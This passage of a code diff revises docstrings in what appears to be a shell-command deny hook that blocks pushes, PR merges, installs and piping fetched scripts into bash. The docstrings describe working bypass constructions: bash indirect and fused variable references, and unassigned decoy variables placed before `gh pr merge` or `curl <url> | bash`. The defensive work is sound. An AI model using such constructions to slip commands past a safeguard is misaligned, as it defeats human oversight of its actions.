             # including any of those FUSED with literal text in the same
-            # token) -- found live by Step 8 independent review, ninth
-            # round (default-clause: see that function's own docstring),
-            # tenth round (`GITREF=G; G=git; PUSHREF=P; P=push; ${!GITREF}
-            # ${!PUSHREF} origin main` resolves, real bash, to a genuine
-            # `git push origin main`), and eleventh round (fused
-            # indirection: the whole-token-anchored resolvers this rule
-            # used through the tenth round could never see a construct
-            # fused with literal text in the same token), issue #1326.
+            # token) -- default clauses (see that function's own
+            # docstring), indirect references (`GITREF=G; G=git;
+            # PUSHREF=P; P=push; ${!GITREF} ${!PUSHREF} origin main`
+            # resolves, real bash, to a genuine `git push origin main`),
+            # and fused indirection (invisible to any whole-token-
+            # anchored resolver) alike.
             # Any candidate set too large to enumerate soundly is treated
             # as an unresolved-but-plausible match -- fail closed.
             values = _resolve_seg_tokens_candidates(seg, name_to_value, name_to_raw_value)
@@ -2741,15 +2450,12 @@ def _rule_b1a_dynamic_word_same_segment_verb(
     `_substitute_var_refs_candidates` (bare reference, default clause, or
     bash's own `${!NAME}` indirect reference, including any of those
     FUSED with literal text in the same token, e.g. `in${!SUFREF}`
-    reconstructing to "install"), not just a plain literal token. Found
-    live by Step 8 independent review, ninth round (default-clause: see
-    that function's own docstring), tenth round (`${!NAME}` indirect
-    reference: see the sibling module's own tenth-round B1a fix), and
-    eleventh round (fused indirection: the whole-token-anchored resolvers
-    this rule used through the tenth round could never see a construct
-    fused with literal text in the same token -- confirmed via real bash
-    argv expansion that `$T in${!SUFREF} foo` resolves to a genuine `uv
-    install foo`), issue #1326. Any candidate set too large to enumerate
+    reconstructing to "install"), not just a plain literal token --
+    default clauses (see that function's own docstring), `${!NAME}`
+    indirect references, and fused indirection (under real bash argv
+    expansion, `$T in${!SUFREF} foo` resolves to a genuine `uv install
+    foo`, which no whole-token-anchored resolver can see) alike. Any
+    candidate set too large to enumerate
     soundly is treated as an unresolved-but-plausible match -- fail
     closed."""
     if not seg or not _is_dynamic(seg[0]):
@@ -2774,22 +2480,20 @@ def _rule_b1b_dynamic_word_assigned_tool_and_verb(
     Scoped to what THIS segment's own dynamic tokens actually resolve to
     -- not "some assignment anywhere in the whole command happens to look
     like a tool and some unrelated assignment happens to look like a
-    verb," which is unsound: found live by Step 8 independent review
-    (issue #1326), `TOOL=uv; VERB=install; echo done; X=$(mktemp); "$X"
-    --help` was wrongly denied even though `$X` references neither TOOL
-    nor VERB. `seg[0]` (the command word) must itself be dynamic, or a
+    verb," which is unsound: `TOOL=uv; VERB=install; echo done;
+    X=$(mktemp); "$X" --help` would be wrongly denied even though `$X`
+    references neither TOOL nor VERB. `seg[0]` (the command word) must
+    itself be dynamic, or a
     dynamic argument to an otherwise-literal, harmless command would be
     denied for constructing no dynamic command at all.
 
-    Found live by Step 8 independent review, ninth round (default-clause:
-    see `_substitute_var_refs_candidates`'s own docstring), tenth round
-    (`${!NAME}` indirect reference: see `_rule_b1a_dynamic_word_same_
-    segment_verb`'s own tenth-round fix), and eleventh round (fused
-    indirection, each of the tool and verb reconstructed in its OWN
-    token: `g${!HSUF} pr m${!MSUF} 1` resolves, real bash, to a genuine
-    `gh pr merge 1` -- the whole-token-anchored resolvers this rule used
-    through the tenth round could never see a construct fused with
-    literal text in the same token), issue #1326. Any candidate set too
+    Default clauses (see `_substitute_var_refs_candidates`'s own
+    docstring), `${!NAME}` indirect references (see `_rule_b1a_dynamic_
+    word_same_segment_verb`), and fused indirection (each of the tool
+    and verb reconstructed in its OWN token: `g${!HSUF} pr m${!MSUF} 1`
+    resolves, real bash, to a genuine `gh pr merge 1`, which no
+    whole-token-anchored resolver can see) all count. Any candidate set
+    too
     large to enumerate soundly is treated as an unresolved-but-plausible
     match -- fail closed."""
     if not seg or not _is_dynamic(seg[0]):
@@ -2828,8 +2532,8 @@ def _position_anchored_rules_hit(
     interpreter/wrapper position `_skip_fetch_exec_wrapper` resolves FROM
     `seg[0]` (`_rule_fetch_exec`, `_rule_process_sub_fetch_exec`). Unlike
     `_rule_a_literal`/`_rule_npx`/`_rule_git_push` (each a whole-segment-
-    LIST literal-content or whole-segment-candidate scan, confirmed live
-    immune to a leading decoy by construction) -- deliberately NOT
+    LIST literal-content or whole-segment-candidate scan, immune to a
+    leading decoy by construction) -- deliberately NOT
     included here, called once, separately, in `_classify_tokens` instead
     of paying to re-run an already-immune rule a second time for nothing
     -- a position-anchored rule can be defeated by a leading token that
@@ -2843,44 +2547,39 @@ def _position_anchored_rules_hit(
     simplification, it is a second loop. `_classify_tokens` calls this
     function TWICE: once against SEGMENTS/PIPE_CHAINS as-is, once against
     a COLLAPSED reading with each segment's own leading run of vanishing
-    references additionally stripped -- see `_classify_tokens`'s own
-    docstring for the live bypass this closes.
+    references additionally stripped -- see below for the bypass the
+    collapsed pass closes.
 
-    Found live by Step 8 independent review, twenty-first round (issue
-    #1326): `$NEVERSET gh pr merge 1` and `$NEVERSET pnpm` (both
-    NEVERSET never assigned) were wrongly ALLOWED -- `_rule_gh_any`/
-    `_rule_bare_install` each resolve `seg[0]` via `_substitute_var_refs_
-    candidates`, which returns `[]` ("cannot resolve to any sound literal
-    reading") for an unassigned bare/braced reference; both rules treated
-    an empty candidate list the same as "resolved, and it is not a
-    match," never failing closed OR looking past the decoy to what real
-    bash would actually see at that position. `curl <url> | $NEVERSET
-    bash` and `curl <url> | sudo $NEVERSET bash` (the interpreter
-    position, past `_skip_fetch_exec_wrapper`'s own wrapper skip)
-    defeated `_rule_fetch_exec` the identical way. Confirmed live via a
-    real bash proxy (stand-in `gh`/`pnpm`/`bash` binaries on PATH,
-    capturing their own argv) that all four genuinely invoke the denied
-    tool once the decoy word-splits away. `_rule_a_literal`/`_rule_npx`/
-    `_rule_git_push`/B1a/B1b were each confirmed NOT vulnerable to the
-    identical construction (each already scans a segment's own literal
-    content, or every dynamic token in the segment, as a whole -- not one
-    fixed position), so this closes exactly the position-anchored gap,
-    not a broader one. Ported to the main
-    hook's own sibling fix (`_segment_loop_hit`) for its own, narrower
-    equivalent (B2 only -- the main hook has no fetch-exec/bare-install/
-    gh-any-shaped rule at all); that fix's own docstring makes the
-    identical whole-list-scan-stays-outside choice for its own two immune
-    rules (`_rule_a_literal`/`_rule_gh_api_write`), confirming this is not
-    a one-off simplification specific to this file.
+    The collapsed pass exists because `$NEVERSET gh pr merge 1` and
+    `$NEVERSET pnpm` (both NEVERSET never assigned) genuinely invoke
+    the denied tool once the decoy word-splits away, yet
+    `_rule_gh_any`/`_rule_bare_install` each resolve `seg[0]` via
+    `_substitute_var_refs_candidates`, which returns `[]` ("cannot
+    resolve to any sound literal reading") for an unassigned
+    bare/braced reference -- treating an empty candidate list the same
+    as "resolved, and it is not a match" neither fails closed NOR looks
+    past the decoy to what real bash actually sees at that position.
+    `curl <url> | $NEVERSET bash` and `curl <url> | sudo $NEVERSET
+    bash` (the interpreter position, past `_skip_fetch_exec_wrapper`'s
+    own wrapper skip) defeat `_rule_fetch_exec` the identical way.
+    `_rule_a_literal`/`_rule_npx`/`_rule_git_push`/B1a/B1b are NOT
+    vulnerable to the identical construction (each already scans a
+    segment's own literal content, or every dynamic token in the
+    segment, as a whole -- not one fixed position), so this closes
+    exactly the position-anchored gap, not a broader one. The main
+    hook's own sibling (`_segment_loop_hit`) is the narrower equivalent
+    (B2 only -- the main hook has no fetch-exec/bare-install/
+    gh-any-shaped rule at all); its own docstring makes the identical
+    whole-list-scan-stays-outside choice for its own two immune rules
+    (`_rule_a_literal`/`_rule_gh_api_write`), confirming this is not a
+    one-off simplification specific to this file.
 
-    Found live by Step 8 independent review, twenty-second round (issue
-    #1326): the twenty-first round's own first version of this function
-    included `_rule_a_literal`/`_rule_npx`/`_rule_git_push` anyway, "for
-    uniformity" -- paying to re-run three already-immune, whole-list
-    scans a second time on every command that reaches the collapsed pass,
-    for zero behavioral benefit, while the main hook's own sibling fix
-    (in the SAME commit) already demonstrated the leaner alternative costs
-    nothing. Moved out to match."""
+    Including `_rule_a_literal`/`_rule_npx`/`_rule_git_push` here
+    anyway, "for uniformity," would pay to re-run three already-immune,
+    whole-list scans a second time on every command that reaches the
+    collapsed pass, for zero behavioral benefit -- the main hook's own
+    sibling demonstrates the leaner alternative costs nothing, so they
+    stay outside."""
     bare_install_hit = _rule_bare_install(segments, name_to_value, name_to_raw_value)
     if bare_install_hit:
         return bare_install_hit
@@ -2944,13 +2643,12 @@ def _classify_tokens(
     own. Used only by `_rule_array_literal_content`'s own recursive call,
     to give an array literal's own inner content access to the SAME
     shell scope as the rest of the command (see that function's own
-    docstring, nineteenth-round paragraph, for the live bypass this
-    closes) -- `None` (every other caller, including the top-level
+    docstring for the bypass this closes) -- `None` (every other caller,
+    including the top-level
     `classify` and `_rule_command_substitution_content`'s own recursive
     calls -- see that function's own docstring for the disclosed residual
-    this leaves there) preserves this function's prior, scope-free
-    behavior exactly. Ported from the main hook's own nineteenth-round
-    fix of the same finding."""
+    this leaves there) preserves scope-free behavior exactly. Mirrors
+    the main hook's own equivalent scope-threading."""
     outer_literals = outer_name_to_value or {}
     outer_raw = outer_name_to_raw_value or {}
 
